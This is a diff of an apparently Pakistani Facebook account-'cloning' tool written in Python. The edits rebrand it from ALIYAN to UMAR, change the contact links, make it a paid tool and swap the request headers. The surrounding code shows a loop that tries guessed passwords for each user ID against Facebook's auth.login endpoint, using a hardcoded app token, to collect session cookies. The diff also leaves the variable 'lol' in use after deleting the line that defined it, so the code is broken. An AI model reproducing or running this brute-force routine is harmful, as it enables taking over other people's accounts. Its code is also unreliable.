@@ -395,10 +395,10 @@ logo = ("""\033[1;32m
         
  
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
-  \033[1;32mAuther  : ALIYAN TRICKER
-  \033[1;33mYouTube : ALIYAN TRICKER
-  \033[1;32mFecbook : ALIYAN TRICKER
-   \033[1;33m Admin. : ALIYAN TRICKER
+  \033[1;32mAuther  : UMAR TRICKER
+  \033[1;33mYouTube : UMAR TRICKER
+  \033[1;32mFecbook : UMAR TRICKER
+   \033[1;33m Admin. : UMAR TRICKER
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m""")
 
 class Main:
@@ -422,7 +422,7 @@ class Main:
 			print("    Thanks🥰♥️")
 			exit()
 		elif ALIYAN in ["1", "01"]:
-			os.system("xdg-open https://youtu.be/gxjhqkJL_h0")
+			os.system("xdg-open https://www.youtube.com/@uzofficialyt")
 			print("")
 			time.sleep(2.0)
 			print("\033[1;33m    Apna nam type kro")
@@ -430,13 +430,13 @@ class Main:
 			input("\n\033[1;32m  Type Name ==> \033[1;36m")
 			time.sleep(2.1)
 			print("")
-			print("\033[1;32m Successful Bro")
+			print("\033[1;32m Successful")
 			time.sleep(2.0)
 			os.system("clear")
 		
 			print(logo)
 		print("\n\033[1;32m [1] File Cloning")
-		print(" [2]\033[1;33m Public Cloning")
+		print(" [2]\033[1;33m Random Cloning")
 		print(" [3]\033[1;32m Create File")
 		print(" [4]\033[1;33m 2009-10 Cloning")
 		print(" [5]\033[1;32m 2011-14 Cloning")
@@ -858,15 +858,19 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
+			headers ={'authority': 'mobile.facebook.com',
+   			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  			'accept-language': 'en-US,en;q=0.9',
+    			'cache-control': 'max-age=0',
+    			'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+    			'sec-ch-ua-mobile': '?0',
+    			'sec-ch-ua-platform': '"Windows"',
+    			'sec-fetch-dest': 'document',
+    			'sec-fetch-mode': 'navigate',
+    			'sec-fetch-site': 'none',
+    			'sec-fetch-user': '?1',
+    			'upgrade-insecure-requests': '1',
+    			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
@@ -1285,15 +1289,19 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			headers = {
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-				"x-fb-connection-quality": "EXCELLENT",
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": rua, 
-				"content-type": "application/x-www-form-urlencoded", 
-				"x-fb-http-engine": "Liger"
+			headers = {'authority': 'mobile.facebook.com',
+    			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    			'accept-language': 'en-US,en;q=0.9',
+    			'cache-control': 'max-age=0',
+    			'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+    			'sec-ch-ua-mobile': '?0',
+    			'sec-ch-ua-platform': '"Windows"',
+    			'sec-fetch-dest': 'document',
+    			'sec-fetch-mode': 'navigate',
+    			'sec-fetch-site': 'none',
+    			'sec-fetch-user': '?1',
+    			'upgrade-insecure-requests': '1',
+    			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
@@ -1330,8 +1338,8 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m ALIYAN Toll Free BUT You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note : ALIYAN FREE HA BHAIYO ENJOYA   \033[1;37m")
+		print(" \033[1;32m UMAR Toll PAID You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Note : UMAR Paid HA BHAIYO ENJOYA   \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
@@ -1341,14 +1349,10 @@ def Subscraption():
 		print ("")
 		name = input(" Your Name : ")
 		print ("")
-		gf = input(" Your gf Name : ")
-		print ("")
-		lol = input(" Your Your Email : ")
-		print ("")
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
-		os.system('am start https://wa.me/+923091235363?text=' + tks)
+		os.system('am start https://wa.me/+923152083002?text=' + tks)
 		Subscraption()        
 Subscraption()
 
